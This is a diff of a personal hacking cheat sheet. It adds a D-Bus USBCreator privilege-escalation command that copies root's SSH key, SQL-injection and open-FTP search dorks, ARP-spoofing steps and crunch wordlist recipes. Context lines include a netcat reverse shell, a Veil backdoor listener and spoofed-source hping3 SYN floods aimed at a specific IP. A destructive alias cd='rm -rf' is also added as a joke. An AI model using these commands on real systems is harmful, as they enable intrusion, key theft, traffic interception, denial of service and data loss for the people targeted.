@@ -15,9 +15,16 @@
 12. `.conf` file may contain something. (usually in /etc/apache2)
 13. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
 14. 
-- SMB enum >>> smbclient -L //[IP], and continue with the shares name  smbclient //[IP]/[sharename]
+- SMB enum >>> smbclient -L //[IP](its_the_same_like_--list=[IP]), and continue with the shares name  smbclient //[IP]/[sharename]
 - smbclient //[IP]/[sharename] --user=[username] --workgroup=[forest name] 
 16. rpcclient --user=[username] [target-ip] -W [forest name]
+17. Check cdata
+18. gdbuss root ssh privesc 
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_rsa true
+https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
+19. Port 11211 is memcached server >>> https://www.hackingarticles.in/penetration-testing-on-memcached-server/
+20. Always check `netstat -tulpn`
+21. Enum smtp with telnet.
 
 **Impacket**
 1. GetNPUsers.py >> This script can check of the usernames are existing and if they have Kerberos pre-authentication enabled
@@ -101,6 +108,55 @@ encode it with shikata_ga_nai if u want
 2. ssh -i id_rsa [user]@[ip]
 
 
+**Dorking**
+1. Possible SQLi target >>> inurl:"product.php?id=" & intext:"You have an error in your SQL syntax"
+2. Open FTP >>> "intitle: index of" inurl:ftp
+
+
+**ARP**
+Enable port forwarding
+## echo 1 > /proc/sys/net/ipv4/ip_forward
+### Poisoning
+1. sudo arpspoof -i [interface] -t [target_ip] [gateway_ip]
+2. sudo arpspoof -i [interface] -t [gateway] [target_ip]
+Or just langsung pake -r (both direction)
+1. sudo arpspoof -i [interface] -t [target_ip] -r [gateway_ip]
+
+### Sniff
+1. After poisoning, sniff packets with wireshark
+2. Or just use bettercap and do this all automaticly tbh.
+
+
+**Wireshark**
+1. [FILTER] && [FILTER] && [FILTER] >>> Filtering stuff
+Ex: ip.src == [IP] && http 
+2. Follow the stream~
+
+
+**Crunch**
+
+## Generate wordlists with Crunch
+Ex: 
+Default charset is lowecase alphabet
+- crunch [min-length] [max-lenth] ([charset] [option]) >>> optional
+- crunch 2 4
+- crunch 1 2 soni siu sia >>> min and max length is required but in this case wont be used.
+- crunch 6 6 -t d%d%d% -p rara riri ruru >> d is the word location. The length will be more than 6. When we use -p length is just a formality/
+- etc.. just read the man
+
+## Important Options
+
+Pattern (-t)
+@ -> lowercase character
+, -> uppercase character
+% -> numbers
+^ -> symbol
+- crunch 7 7 -t @,%^123 -o wordlist.txt (notice that min-max length have to be the same as pattern length)
+
+Charset (-f)
+- Lookat the preset charsets in /usr/share/crunch/charset.lst
+- crunch 2 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -o ww.txt
+
 **Random**
 1. hashcat --example-hash >> or just visit the one in the web
 2. diff -y [file1] [file2] >> compare file side by side
@@ -114,11 +170,11 @@ Generate
 msfconsole --resource /var/lib/veil/output/handlers/[yourbackdoor]
 7. nc -e /bin/bash [ip] [port]
 8. from binascii import unhexlify >> unhexlify to convert hex to string
-9. Generate wordlists with crunch
-10. hping3 DOS
+9. hping3 DOS
 	hping3 -S [host] -p ++[initial_port] >>> Port status discovery (open/not)
 	hping3 -S [host] -p [port] -a [disguised_host] --flood
 	hping3 -S [host] -p [port] -a [disguised_host] --flood --rand-source
 
 	example: sudo hping3 -S 45.33.32.156 -p 80 -a 173.203.36.104 --flood --rand-source -V >>> -V for verbose
+10. alias cd='rm -rf' >> LOL DONT DO THIS
 
